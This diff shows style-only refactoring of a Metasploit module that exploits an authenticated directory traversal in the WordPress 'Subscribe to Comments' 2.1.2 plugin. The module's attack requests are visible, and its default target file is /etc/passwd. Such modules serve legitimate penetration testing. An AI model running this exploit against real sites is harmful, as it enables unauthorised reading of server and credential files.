@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,39 +7,38 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HTTP::Wordpress
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'WordPress Subscribe Comments File Read Vulnerability',
-      'Description'    => %q{
-        This module exploits an authenticated directory traversal vulnerability
-        in WordPress Plugin "Subscribe to Comments" version 2.1.2, allowing
-        to read arbitrary files with the web server privileges.
-      },
-      'References'     =>
-        [
-          ['WPVDB', '8102'],
-          ['PACKETSTORM', '132694'],
-          ['URL', 'https://security.dxw.com/advisories/admin-only-local-file-inclusion-and-arbitrary-code-execution-in-subscribe-to-comments-2-1-2/']
-        ],
-      'Author'         =>
-        [
-          'Tom Adams <security[at]dxw.com>', # Vulnerability Discovery
-          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
-        ],
-      'License'        => MSF_LICENSE
-    ))
+                      'Name'           => 'WordPress Subscribe Comments File Read Vulnerability',
+                      'Description'    => %q(
+                        This module exploits an authenticated directory traversal vulnerability
+                        in WordPress Plugin "Subscribe to Comments" version 2.1.2, allowing
+                        to read arbitrary files with the web server privileges.
+                      ),
+                      'References'     =>
+                        [
+                          ['WPVDB', '8102'],
+                          ['PACKETSTORM', '132694'],
+                          ['URL', 'https://security.dxw.com/advisories/admin-only-local-file-inclusion-and-arbitrary-code-execution-in-subscribe-to-comments-2-1-2/']
+                        ],
+                      'Author'         =>
+                        [
+                          'Tom Adams <security[at]dxw.com>', # Vulnerability Discovery
+                          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
+                        ],
+                      'License'        => MSF_LICENSE))
 
     register_options(
       [
         OptString.new('WP_USER', [true, 'A valid username', nil]),
         OptString.new('WP_PASS', [true, 'Valid password for the provided username', nil]),
         OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd'])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def user
@@ -97,16 +97,16 @@ class MetasploitModule < Msf::Auxiliary
         'sg_subscribe_settings[subscribed_text]' => 'teste',
         'sg_subscribe_settings[author_text]' => '',
         'sg_subscribe_settings[use_custom_style]' => 'use_custom_style',
-        'sg_subscribe_settings[header]' => "#{filename}",
+        'sg_subscribe_settings[header]' => filename.to_s,
         'sg_subscribe_settings[sidebar]' => '',
         'sg_subscribe_settings[footer]' => '',
         'sg_subscribe_settings[before_manager]' => '',
         'sg_subscribe_settings[after_manager]' => '',
         'sg_subscribe_settings_submit' => 'Update Options',
-        '_wpnonce' => "#{nonce}",
+        '_wpnonce' => nonce.to_s,
         '_wp_http_referer' => '/wp-admin/options-general.php?page=stc-options'
       },
-      'cookie'    => cookie
+      'cookie' => cookie
     )
 
     if res && res.code == 200 && res.body.include?("<p><strong>Options saved.</strong>")
@@ -144,15 +144,15 @@ class MetasploitModule < Msf::Auxiliary
       'vars_get'  => {
         'wp-subscription-manager' => '1'
       },
-      'cookie'    => cookie
+      'cookie' => cookie
     )
 
     if res && res.code == 200 &&
-        res.body.length > 830 &&
-        res.body.include?(">Find Subscriptions</") &&
-        res.headers['Content-Length'].to_i > 830
+       res.body.length > 830 &&
+       res.body.include?(">Find Subscriptions</") &&
+       res.headers['Content-Length'].to_i > 830
 
-      res_clean = res.body.gsub(/\t/, '').gsub(/\r\n/, '').gsub(/<.*$/, "")
+      res_clean = res.body.delete("\t").gsub(/\r\n/, '').gsub(/<.*$/, "")
 
       vprint_line("\n#{res_clean}")
       fname = datastore['FILEPATH']
